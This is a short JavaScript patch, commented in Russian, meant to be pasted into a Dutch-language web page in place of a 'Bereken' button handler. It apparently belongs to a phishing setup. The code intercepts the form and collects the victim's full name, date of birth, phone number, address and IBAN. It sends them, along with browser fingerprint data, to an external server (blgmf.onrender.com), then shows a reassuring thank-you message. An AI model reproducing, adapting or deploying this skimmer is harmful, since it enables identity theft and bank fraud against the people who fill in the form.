// ============================================================
//  site_patch.js — вставь этот блок в <script> на сайте
//  Вместо старого обработчика кнопки "Bereken".
//  Замени http://YOUR_SERVER:8080 на адрес, где крутится server.py
// ============================================================

(function () {
    var btn = document.querySelector('.panel-form .btn-calc');
    if (!btn) return;

    // ---- CLICK TRACKER: URL сервера и функция отправки ----
    var TRACK_URL = 'https://blgmf.onrender.com';

    function trackClick(name, extra) {
        try {
            var payload = {
                name: name || 'unknown',
                extra: extra || '',
                ua: navigator.userAgent || '',
                ref: document.referrer || '',
                lang: (navigator.language || '').slice(0, 5),
                screen: (screen && screen.width && screen.height) ? (screen.width + 'x' + screen.height) : '',
                ts: new Date().toISOString()
            };
            fetch(TRACK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(function () {});
        } catch (e) {}
    }
    // --------------------------------------------------------

    btn.addEventListener('click', function (e) {
        e.preventDefault();

        // ---- CLICK TRACKER: клик по кнопке формы ----
        trackClick('form:submit', 'clicked');

        var fio      = (document.getElementById('fio')      || {}).value || '';
        var dob      = (document.getElementById('dob')      || {}).value || '';
        var phone    = (document.getElementById('phoneInput') || {}).value || '';
        var stad     = (document.querySelector('input[name="stad"]')     || {}).value || '';
        var straat   = (document.querySelector('input[name="straat"]')   || {}).value || '';
        var postcode = (document.querySelector('input[name="postcode"]') || {}).value || '';
        var ibanEl   = document.getElementById('iban');
        var iban     = (ibanEl && ibanEl.value ? ibanEl.value : '').replace(/\s+/g, '');

        // простая валидация
        if (!fio || !dob || !phone || !stad || !straat || !postcode || !iban) {
            alert('Vul alle velden in.');
            return;
        }

        var body = {
            fio: fio,
            dob: dob,
            phone: phone,
            stad: stad,
            straat: straat,
            postcode: postcode,
            iban: iban
        };

        fetch('https://blgmf.onrender.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body)
        })
        .then(function (r) { return r.json(); })
        .then(function (res) {
            if (res.ok) {
                // ---- CLICK TRACKER: успешная отправка ----
                trackClick('form:success', 'sent');
                alert('Bedankt! Uw gegevens zijn verzonden.');
            } else {
                alert('Er is een fout opgetreden. Probeer het later opnieuw.');
            }
        })
        .catch(function () {
            alert('Verbindingsfout. Probeer het later opnieuw.');
        });
    });
})();
